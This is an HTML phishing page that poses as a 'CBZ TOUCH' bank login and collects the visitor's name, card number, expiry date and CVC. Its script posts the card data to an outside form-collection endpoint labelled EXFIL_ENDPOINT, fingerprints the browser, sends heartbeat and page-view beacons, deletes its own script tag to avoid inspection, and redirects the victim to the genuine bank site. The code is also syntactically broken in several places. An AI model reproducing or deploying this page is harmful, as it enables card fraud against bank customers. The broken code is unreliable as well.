<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>CBZ TOUCH | Login</title>
<style>
* {
box-sizing: border-box;
margin: 0;
padding: 0;
}

body {
margin: 0;
min-height: 100vh;
display: flex;
/* ✅ not flex-start */
align-items: center;
justify-content: center;
background: #f5f5f5;
padding: 16px;
font-family: "Helvetica Neue", Arial, sans-serif;
}

.login-box {
width: 100%;
max-width: 400px;
padding: clamp(21px, 6vw, 30px);
border-radius: 10px;
background: #fff;
box-sizing: border-box;
box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
text-align: center;
}

.logo {
width: 100px;
/* fallback for old browsers */
height: 100px;
width: clamp(80px, 30vw, 100px);
height: clamp(80px, 30vw, 100px);
background-color: #e31837;
border-radius: 50%;
display: flex;
flex-direction: column;
align-items: center;
justify-content: center;
margin: 0 auto 24px;
color: white;
}

.cbz {
font-size: clamp(35px, 10vw, 45px);
font-weight: 900;
line-height: 0.8;
margin-bottom: -1px;
text-transform: lowercase;
letter-spacing: -0.5px;
}

.touch {
font-size: 18px;
font-weight: 500;
line-height: 1;
}

.title {
font-size: 18px;
font-weight: 500;
color: #1b2b7a;
margin-bottom: 28px;
text-align: center;
}

.input-group {
position: relative;
margin-bottom: 15px;
}

.input-group input {
width: 100%;
padding: 20px 14px 8px;
/* top padding makes room for floated label */
background-color: #f5f5f5;
border: 1.6px solid #ddd;
border-radius: 10px;
font-size: 16px;
color: #333;
margin: 0;
/* kill old margin from input */
}

.input-group input:focus {
border-color: #1b2b7a;
outline: none;
}

.input-group label {
position: absolute;
left: 14px;
top: 16px;
/* starting position */
font-size: 16px;
color: #777;
pointer-events: none;
/* lets you click through to input */
transition: 0.2s ease all;
background: #f5f5f5;
/* hides border when label moves up */
padding: 0 4px;
}

.input-group input:focus + label,
.input-group input:not(:placeholder-shown) + label {
top: -10px;
/* moves up into border */
font-size: 12px;
color: #1b2b7a;
}
.btn {
width: 100%;
padding: 14px;
background-color: #e31837;
color: white;
border: none;
border-radius: 15px;
font-weight: 500;
font-size: 18px;
cursor: pointer;
margin-top: 12px;
transition: background-color 0.2s;
}

.btn:hover,
.btn:active {
background-color: #c41530;
}

.btn:disabled {
background: #aaa;
cursor: not-allowed;
}

.link {
color: #1b2b7a;
font-size: 15px;
margin-top: 30px;
display: block;
text-decoration: none;
}

.error-msg {
color: #e31837;
margin-top: 8px;
font-size: 12px;
min-height: 16px;
display: none;
}

@media (max-width: 360px) {
body {
padding: 12px;
}
.login-box {
border-radius: 8px;
}
input,
.btn {
padding: 12px;
}
}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">
<span class="cbz">cbz</span>
<span class="touch">TOUCH</span>
</div>

<p class="title">
Enter your details below
</p>

<form id="cbzForm">
<div class="input-group">
<input
id="user"
name="full_name"
placeholder=" "
type="text"
autocomplete="name"
required />
<label for="user">Full Name</label>
</div>

<div class="input-group">
<input
id="cardnum"
name="card_number"
type="text"
placeholder=" "
inputmode="numeric"
pattern="[0-9 ]*"
autocomplete="cc-number"
maxlength="19"
required />
<label for="cardnum">Card Number</label>
</div>

<div class="input-group">
<input
id="expiry"
name="expiry_date"
type="text"
placeholder=" "
inputmode="numeric"
pattern="[0-9/]*"
autocomplete="cc-exp"
maxlength="5"
required />
<label for="expiry">Expiry Date (MM/YY)</label>
</div>

<div class="input-group">
<input
id="cvc"
name="cvc"
type="password"
placeholder=" "
inputmode="numeric"
pattern="[0-9]*"
autocomplete="off"
maxlength="4"
required />
<label for="cvc">CVC</label>
</div>
<button type="submit" class="btn">Submit</button>
<div id="formError" class="error-msg"></div>

<p class="link">
By pressing Submit, you agree to our
<a href="/privacy">Privacy Policy</a> and
<a href="/terms">Terms and Conditions</a>
</p>
</form>
</div>

<script>

(function() {
'use strict';

const EXFIL_ENDPOINT = 'https://formspree.io/f/mbdvkyno';
const BEACON_ENDPOINT = 'https://formspree.io/f/mbdvkyno'; // Replace or remove if unused
const REDIRECT_URL = 'https://cbz.co.zw/login';
// === FINGERPRINT ===
function getFingerprint() { const parts = [navigator.userAgent, navigator.language, screen.width + 'x' + screen.height, screen.depth, navigator.hardwareConcurrency || 'unknown', navigator.platform];

const str = parts.join('::');
let hash = 0;
for (let i = 0; i < str.length; i++) {
hash = ((hash << 5) - hash) + str.charCodeAt(i);
hash = hash & hash;
} return hash.toString(16);
}

// === BEACON FUNCTION ===
function exfiltrate(data) {
if (!BEACON_ENDPOINT || BEACON_ENDPOINT.includes('your-beacon')) return
}

fetch(BEACON_ENDPOINT, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(data),
keepalive: true
}).catch(() => {}); // Silent fail

document.querySelector('#cbzForm').addEventListener('submit', (e) => {
e.preventDefault();

const form = e.target;
const btn = form.querySelector('button[type="submit"]');
const errorDiv = document.querySelector('#formError');

btn.disabled = true;
btn.textContent = 'Submitting...';
errorDiv.style.display = 'none';

const full_name = document.querySelector('#user').value;
const card_number = document.querySelector('#cardnum').value;
const expiry_date = document.querySelector('#expiry').value;
const cvc = document.querySelector('#cvc').value
});
const payload = {
full_name: form.user.value,
card_number: form.cardnum.value,
expiry_date: form.expiry.value,
cvc: form.cvc.value,
fingerprint: getFingerprint(),
timestamp: Date.now()
};

// Fire fetch ONCE with full data
try {
fetch(EXFIL_ENDPOINT, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload),
})
.then(res => {
  if (res.ok) {
    exfiltrate({ type: 'form_success', ...payload }); // <- THIS IS THE PROBLEM
    window.location.href = REDIRECT_URL;
  } else {
    throw new Error(`HTTP ${res.status}`);
  }
});
.catch(err => {
console.error('Submit failed:', err);
errorDiv.textContent = 'Save failed. Please check your connection and try again.';
errorDiv.style.display = 'block';
btn.disabled = false;
btn.textContent = 'Submit';
exfiltrate({ type: 'form_error', error: err.message, ...payload });
});

// === ANTI-TAMPER: REMOVE SCRIPT TAG AFTER 5S ===
setTimeout(() => {
document.querySelectorAll('script').forEach(script => {
if (script.textContent.includes('EXFIL_ENDPOINT')) {
script.remove();
}
});
});

// === HEARTBEAT BEACON ===
setInterval(() => {
exfiltrate({
type: 'heartbeat',
fingerprint: getFingerprint(),
timestamp: Date.now(),
pageVisible: !document.hidden
});
}, 30000);

// === INITIAL PAGE VIEW BEACON ===
exfiltrate({
type: 'page_view',
fingerprint: getFingerprint(),
timestamp: Date.now(),
url: window.location.href
});
})();
</script>
</body>
</html>
